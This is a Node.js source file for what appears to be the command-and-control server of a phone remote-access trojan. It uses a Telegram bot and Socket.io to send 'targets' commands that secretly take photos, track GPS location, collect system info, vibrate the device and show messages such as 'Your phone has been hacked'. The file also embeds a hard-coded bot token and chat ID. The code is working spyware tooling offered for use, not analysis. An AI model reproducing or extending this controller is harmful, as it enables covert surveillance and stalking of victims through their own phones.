const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// === ⚡ KONFIGURASI (ISI TOKEN TUAN!) ⚡ ===
const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; 
const bot = new Telegraf(BOT_TOKEN);

// UI Menu Utama Anti-Error
const mainMenu = async (ctx) => {
    const text = `⚡ *FIONZY CONTROL PANEL v8\\.0* ⚡\n` +
                 `──────────────\n` +
                 `📱 *Status:* ONLINE\n` +
                 `🛡️ *Protocol:* ULTRA SECURE\n` +
                 `──────────────\n` +
                 `*Pilih Perintah Kendali:*`;
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('📸 Take Photo', 'snap'), Markup.button.callback('📍 Track GPS', 'gps')],
        [Markup.button.callback('📳 Vibrate', 'vibrate'), Markup.button.callback('🔋 System Info', 'info')],
        [Markup.button.callback('💬 Send Toast', 'ask_toast'), Markup.button.callback('🔄 Refresh', 'menu')]
    ]);
    try {
        await ctx.replyWithMarkdownV2(text, keyboard);
    } catch (e) { console.log("Gagal kirim menu: " + e.message); }
};

// Logika Socket & Notifikasi Target Masuk
io.on('connection', (socket) => {
    console.log('⚡ Target Baru Terhubung!');
    // Kirim notif ke bot (Ganti ID jika perlu)
    bot.telegram.sendMessage(ctx?.chat?.id || '7373392803', "✅ **TARGET BARU ONLINE!**\nKetik /menu untuk kendali.", { parse_mode: 'Markdown' }).catch(() => {});
});

bot.start((ctx) => mainMenu(ctx));
bot.command('menu', (ctx) => mainMenu(ctx));

// Handler Tombol (Dibuat Cepat agar tidak expired)
bot.action('snap', (ctx) => { ctx.answerCbQuery('📸 Meminta Foto...').catch(() => {}); io.emit('command', '/snap'); });
bot.action('gps', (ctx) => { ctx.answerCbQuery('📍 Melacak GPS...').catch(() => {}); io.emit('command', '/gps'); });
bot.action('vibrate', (ctx) => { ctx.answerCbQuery('📳 Bergetar!').catch(() => {}); io.emit('command', '/vibrate'); });
bot.action('info', (ctx) => { ctx.answerCbQuery('🔋 Mengambil Info...').catch(() => {}); io.emit('command', '/info'); });
bot.action('menu', (ctx) => mainMenu(ctx));
bot.action('ask_toast', (ctx) => ctx.reply("Ketik: `/toast [pesan]`\nContoh: `/toast HP Anda Diretas!`"));

// Handler Toast & Anti-Crash
bot.on('text', (ctx) => {
    if (ctx.message.text.startsWith('/toast ')) {
        io.emit('command', ctx.message.text);
        ctx.reply("✅ Toast Terkirim ke Target!");
    }
});

// PELINDUNG ANTI-CRASH (Wajib ada!)
process.on('uncaughtException', (err) => { console.log('❌ Error Dicegah: ' + err.message); });
process.on('unhandledRejection', (res) => { console.log('❌ Rejection Dicegah: ' + res); });

server.listen(3000, '0.0.0.0', () => {
    console.log('⚡ SERVER FIONZY v8.0 AKTIF');
    console.log('⚡ PORT: 3000 | BOT: ONLINE');
});
bot.launch().catch(e => console.log("Bot gagal jalan: " + e.message));
